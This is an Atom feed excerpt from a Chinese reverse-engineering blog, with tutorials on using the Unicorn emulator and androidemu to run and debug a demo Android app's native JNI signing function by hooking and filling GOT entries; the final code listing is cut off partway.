    <link href="https://pa1r0t.github.io/2022/12/31/unicorn-learning3/"/>
    <id>https://pa1r0t.github.io/2022/12/31/unicorn-learning3/</id>
    <published>2022-12-31T01:12:04.000Z</published>
    <updated>2022-12-31T03:18:14.288Z</updated>
    
    <content type="html"><![CDATA[<p>unicorn start</p><p>模拟器框架自动填充got表项内容</p><span id="more"></span><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>hook JNI函数</p><p><img src="/./../images/image-20221231092735710.png" alt="image-20221231092735710"></p><p>hook JNI函数的条件：</p><p><img src="/./../images/1.png" alt="1"></p><p>框架：<img src="/./../images/image-20221231093245212.png" alt="image-20221231093245212"></p><h3 id="打印调试信息"><a href="#打印调试信息" class="headerlink" title="打印调试信息"></a>打印调试信息</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.debug,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">                    )</span><br><span class="line"><span class="comment"># 用于打印调试信息</span></span><br><span class="line">logger = logging.getLogger(__name__)</span><br></pre></td></tr></table></figure><h3 id="创建模拟器-导入so文件-执行"><a href="#创建模拟器-导入so文件-执行" class="headerlink" title="创建模拟器+导入so文件+执行"></a>创建模拟器+导入so文件+执行</h3><p>用写好的框架进行模拟执行，不需要考虑手动填充got表项</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建模拟器</span></span><br><span class="line">emulator = Emulator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载相关so文件</span></span><br><span class="line"><span class="comment"># do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，</span></span><br><span class="line"><span class="comment"># 这可能会涉及更多库的调用</span></span><br><span class="line">emulator.load_library(<span class="string">&#x27;./lib/libc.so&#x27;</span>,do_init=<span class="literal">False</span>)</span><br><span class="line">libnat_mod = emulator.load_library(<span class="string">&#x27;./lib/libnative-lib.so&#x27;</span>,do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始执行想要执行的jni函数</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 根据so模块调用指定的函数，后面都是函数的参数</span></span><br><span class="line">    <span class="comment"># 参数1: JNIEnv</span></span><br><span class="line">    <span class="comment"># 参数2: 是java类的对象，这里填0即可</span></span><br><span class="line">    <span class="comment"># 参数3: 是函数输入字符串</span></span><br><span class="line">    sign = emulator.call_symbol(libnat_mod,<span class="string">&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;</span>,</span><br><span class="line">                         emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sign)</span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p>这里出现libc的基地址</p><p><img src="/./../images/image-20221231100141520.png" alt="image-20221231100141520"></p><p>这里出现libnative-lib.so的基地址。3）处有报错，但又不知道哪里有错</p><p><img src="/./../images/image-20221231100259956.png" alt="image-20221231100259956"></p><h3 id="跟踪报错信息"><a href="#跟踪报错信息" class="headerlink" title="跟踪报错信息"></a>跟踪报错信息</h3><p>打印异常地址和地址调用栈,这里打印最后100条即可,用udbg打印</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址</span></span><br><span class="line">dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始执行想要执行的jni函数</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 根据so模块调用指定的函数，后面都是函数的参数</span></span><br><span class="line">    <span class="comment"># 参数1: JNIEnv</span></span><br><span class="line">    <span class="comment"># 参数2: 是java类的对象，这里填0即可</span></span><br><span class="line">    <span class="comment"># 参数3: 是函数输入字符串</span></span><br><span class="line">    sign = emulator.call_symbol(libnat_mod,<span class="string">&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;</span>,</span><br><span class="line">                         emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sign)</span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 打印调用栈</span></span><br><span class="line">    tracks = dbg.get_tracks()</span><br><span class="line">    <span class="comment"># 这里打印调用地址即可，打印后100条</span></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> tracks[-<span class="number">100</span>:-<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(addr - <span class="number">0xcbc66000</span>)) <span class="comment"># 注意这里要减去基地址</span></span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p>这里有函数参数提示：</p><p><img src="/./../images/image-20221231100710715.png" alt="image-20221231100710715"></p><p>这里有出现负地址，负地址就是函数执行到libc.so文件中，这里由于没有初始化的缘故，可能libc中部分函数执行失败，这里我们手动hook，&#x3D;&#x3D;本质是hook got表地址&#x3D;&#x3D;</p><p><img src="/./../images/image-20221231101354303.png" alt="image-20221231101354303"></p><p>这里我们定位到ida中出错的地址</p><p><img src="/./../images/image-20221231101510570.png" alt="image-20221231101510570"></p><p>发现是这个库函数有问题。那就hook它</p><p><img src="/./../images/image-20221231102149719.png" alt="image-20221231102149719"></p><h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><p>添加hook 此处必须在导入so文件之前就hook，在导入so文件之前hook才生效，导入之后没法hook</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__aeabi_memclr</span>(<span class="params">mu,addr,size</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27;</span> % (addr,size))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容</span></span><br><span class="line"><span class="comment"># 在导入so文件之前hook才生效，导入之后没法hook</span></span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;__aeabi_memclr&#x27;</span>, emulator.hooker.write_function(__aeabi_memclr) + <span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其他函数以此类推</p><p>关于sprintf函数，第一个参数，是a2，就是buffer地址</p><p><img src="/./../images/image-20221231103838068.png" alt="image-20221231103838068"></p><p>全部函数hook后：</p><p><img src="/./../images/image-20221231104133180.png" alt="image-20221231104133180"></p><p>这里输出是空因为，我们hook相关函数还未在unicorn中实现，这里我们做个实现即可</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__aeabi_memclr</span>(<span class="params">mu,addr,size</span>):</span><br><span class="line">    mu.mem_write(addr,<span class="built_in">bytes</span>(size))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27;</span> % (addr,size))</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__aeabi_memcpy</span>(<span class="params">mu,dist,source,size</span>):</span><br><span class="line">    data = mu.mem_read(source,size)</span><br><span class="line">    mu.mem_write(dist,<span class="built_in">bytes</span>(data))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27;</span> % (dist,source))</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sprintf</span>(<span class="params">mu,buffer,<span class="built_in">format</span>,arg1,arg2</span>):</span><br><span class="line">    format1 = memory_helpers.read_utf8(mu,<span class="built_in">format</span>)</span><br><span class="line">    data1 = memory_helpers.read_utf8(mu,arg1)</span><br><span class="line">    res = format1 % (data1,arg2)</span><br><span class="line">    mu.mem_write(buffer,<span class="built_in">bytes</span>((res+<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;sprintf (%s)&#x27;</span> % (<span class="built_in">format</span>))</span><br></pre></td></tr></table></figure><p>这里说明一下bytes()函数放入int型会输出什么：</p><p><img src="/./../images/image-20221231104346170.png" alt="image-20221231104346170"></p><p>最终结果：</p><p><img src="/./../images/image-20221231105346413.png" alt="image-20221231105346413"></p><p>全部代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method</span><br><span class="line"><span class="keyword">from</span> UnicornTraceDebugger <span class="keyword">import</span> udbg</span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">                    )</span><br><span class="line"><span class="comment"># 用于打印调试信息</span></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__aeabi_memclr</span>(<span class="params">mu,addr,size</span>):</span><br><span class="line">    mu.mem_write(addr,<span class="built_in">bytes</span>(size))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27;</span> % (addr,size))</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__aeabi_memcpy</span>(<span class="params">mu,dist,source,size</span>):</span><br><span class="line">    data = mu.mem_read(source,size)</span><br><span class="line">    mu.mem_write(dist,<span class="built_in">bytes</span>(data))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27;</span> % (dist,source))</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sprintf</span>(<span class="params">mu,buffer,<span class="built_in">format</span>,arg1,arg2</span>):</span><br><span class="line">    format1 = memory_helpers.read_utf8(mu,<span class="built_in">format</span>)</span><br><span class="line">    data1 = memory_helpers.read_utf8(mu,arg1)</span><br><span class="line">    res = format1 % (data1,arg2)</span><br><span class="line">    mu.mem_write(buffer,<span class="built_in">bytes</span>((res+<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;sprintf (%s)&#x27;</span> % (<span class="built_in">format</span>))</span><br><span class="line"><span class="comment"># 创建模拟器</span></span><br><span class="line">emulator = Emulator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容</span></span><br><span class="line"><span class="comment"># 在导入so文件之前hook才生效，导入之后没法hook</span></span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;__aeabi_memclr&#x27;</span>, emulator.hooker.write_function(__aeabi_memclr) + <span class="number">1</span>)</span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;__aeabi_memcpy&#x27;</span>, emulator.hooker.write_function(__aeabi_memcpy) + <span class="number">1</span>)</span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;sprintf&#x27;</span>, emulator.hooker.write_function(sprintf) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载相关so文件</span></span><br><span class="line"><span class="comment"># do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，</span></span><br><span class="line"><span class="comment"># 这可能会涉及更多库的调用</span></span><br><span class="line">emulator.load_library(<span class="string">&#x27;./lib/libc.so&#x27;</span>,do_init=<span class="literal">False</span>)</span><br><span class="line">libnat_mod = emulator.load_library(<span class="string">&#x27;./lib/libnative-lib.so&#x27;</span>,do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址</span></span><br><span class="line">dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始执行想要执行的jni函数</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 根据so模块调用指定的函数，后面都是函数的参数</span></span><br><span class="line">    <span class="comment"># 参数1: JNIEnv</span></span><br><span class="line">    <span class="comment"># 参数2: 是java类的对象，这里填0即可</span></span><br><span class="line">    <span class="comment"># 参数3: 是函数输入字符串</span></span><br><span class="line">    sign = emulator.call_symbol(libnat_mod,<span class="string">&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;</span>,</span><br><span class="line">                         emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sign)</span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 打印调用栈</span></span><br><span class="line">    tracks = dbg.get_tracks()</span><br><span class="line">    <span class="comment"># 这里打印调用地址即可，打印后100条</span></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> tracks[-<span class="number">100</span>:-<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(addr - <span class="number">0xcbc66000</span>))</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;unicorn start&lt;/p&gt;
&lt;p&gt;模拟器框架自动填充got表项内容&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>unicorn_learning2</title>
    <link href="https://pa1r0t.github.io/2022/12/30/unicorn-learning2/"/>
    <id>https://pa1r0t.github.io/2022/12/30/unicorn-learning2/</id>
    <published>2022-12-30T01:40:33.000Z</published>
    <updated>2022-12-30T07:24:54.480Z</updated>
    
    <content type="html"><![CDATA[<p>unicorn start</p><p>用unicorn调用so文件中的某个函数，观察函数的输入与输出</p><span id="more"></span><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>hook  so文件中的sign1函数的输出与输入</p><p><img src="/./../images/image-20221230100636171.png" alt="image-20221230100636171"></p><p>这个函数内部调用了两个函数，tea_encrypt和sprintf，这两个函数中tea_encrypt函数只需要修复got表项即可调用tea_encrypt，但是sprintf函数不行</p><p>这里我们开始实验</p><h3 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h3><p>由于这里的指令都是两个字节为一条指令</p><p><img src="/./../images/image-20221230145634256.png" alt="image-20221230145634256"></p><p>所以这里为thumb指令集</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_arm</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Emulate ARM code&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Initialize emulator in ARM mode</span></span><br><span class="line">        mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)<span class="comment"># 创建代码</span></span><br><span class="line">        <span class="comment"># 其它代码添加到此处</span></span><br><span class="line">        <span class="keyword">return</span> mu</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br><span class="line"></span><br><span class="line">mu = test_arm() <span class="comment"># mu就是arm虚拟机</span></span><br></pre></td></tr></table></figure><h3 id="建立内存映射-写入数据"><a href="#建立内存映射-写入数据" class="headerlink" title="建立内存映射+写入数据"></a>建立内存映射+写入数据</h3><p>由于这是要模拟执行一段函数，所以要建立镜像区，栈区，数据段区的内存</p><p>这里各个区的大小存粹靠估算</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">image = <span class="built_in">open</span>(<span class="string">&#x27;./libnative-lib.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 镜像内存</span></span><br><span class="line">image_base = <span class="number">0x0</span></span><br><span class="line">mu.mem_map(image_base, <span class="number">0x10000</span>*<span class="number">8</span>)  <span class="comment"># 这里大小自己估算</span></span><br><span class="line">mu.mem_write(image_base,image)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈内存</span></span><br><span class="line">stack_base = <span class="number">0xa0000</span></span><br><span class="line">stack_size = <span class="number">0x10000</span> * <span class="number">3</span></span><br><span class="line">mu.mem_map(stack_base, stack_size)  <span class="comment"># 这里大小自己估算</span></span><br><span class="line">stack_top = stack_base + stack_size - <span class="number">0x4</span></span><br><span class="line">mu.reg_write(UC_ARM_REG_SP,stack_top)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据段内存</span></span><br><span class="line">a1 = <span class="string">b&#x27;123&#x27;</span></span><br><span class="line">data_base = <span class="number">0xf0000</span></span><br><span class="line">data_size = <span class="number">0x10000</span> * <span class="number">3</span></span><br><span class="line">mu.mem_map(data_base, data_size)  <span class="comment"># 这里大小自己估算</span></span><br><span class="line">mu.mem_write(data_base,a1)</span><br></pre></td></tr></table></figure><p>这里栈区的sp指针应小于栈大小的0x4，防止栈溢出，这里我们将‘123’字符串写入数据段，来作为函数的参数使用</p><h3 id="添加hook函数"><a href="#添加hook函数" class="headerlink" title="添加hook函数"></a>添加hook函数</h3><p>主要用于程序报错时可以及时追踪到哪里有问题</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_memory</span>(<span class="params">uc, access, address, size,value, userdata</span>):</span><br><span class="line">    pc = uc.reg_read(UC_ARM_REG_PC)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;memory error: pc:%x address:%x size:%x&quot;</span> % (pc, address, size))</span><br><span class="line">    </span><br><span class="line">mu.hook_add(UC_HOOK_CODE,hook_code,<span class="number">0</span>)</span><br><span class="line">mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="开始执行"><a href="#开始执行" class="headerlink" title="开始执行"></a>开始执行</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开始执行虚拟机</span></span><br><span class="line">start_addr = <span class="number">0x9B68</span></span><br><span class="line">end_addr = <span class="number">0x9C2C</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    mu.emu_start(start_addr, end_addr)</span><br><span class="line">    R2 = mu.reg_read(UC_ARM_REG_R2)</span><br><span class="line">    res = mu.mem_read(R2,<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(binascii.b2a_hex(res))</span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p>结果只运行到第一条指令：</p><p><img src="/./../images/image-20221230141126071.png" alt="image-20221230141126071"></p><p><img src="/./../images/image-20221230141137038.png" alt="image-20221230141137038"></p><p>这里将开始地址+1，然后执行：</p><p><img src="/./../images/image-20221230141419595.png" alt="image-20221230141419595"></p><p><img src="/./../images/image-20221230141523486.png" alt="image-20221230141523486"></p><p>然后这里就遇到了函数地址外的地址，很奇怪！！！，这里找到0x91ac,也就是最后一次正常的地方，发现来到了plt表，点击后又来到got表，这里的got表其实是ida已经自动补全了，unicorn需要自己手动补全</p><p><img src="/./../images/image-20221230141839711.png" alt="image-20221230141839711"></p><p><img src="/./../images/image-20221230142108868.png" alt="image-20221230142108868"></p><p>补全后：</p><p><img src="/./../images/image-20221230152353412.png" alt="image-20221230152353412"></p><p>执行代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开始执行虚拟机</span></span><br><span class="line">start_addr = <span class="number">0x9B68</span></span><br><span class="line">end_addr = <span class="number">0x9C2C</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 添加got表</span></span><br><span class="line">    mu.mem_write(<span class="number">0x1EDB0</span>,<span class="string">b&#x27;\xD9\x98\x00\x00&#x27;</span>)</span><br><span class="line">    mu.emu_start(start_addr+<span class="number">1</span>, end_addr)</span><br><span class="line">    R2 = mu.reg_read(UC_ARM_REG_R2)</span><br><span class="line">    res = mu.mem_read(R2,<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(binascii.b2a_hex(res))</span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><hr><h3 id="最后代码："><a href="#最后代码：" class="headerlink" title="最后代码："></a>最后代码：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const  <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 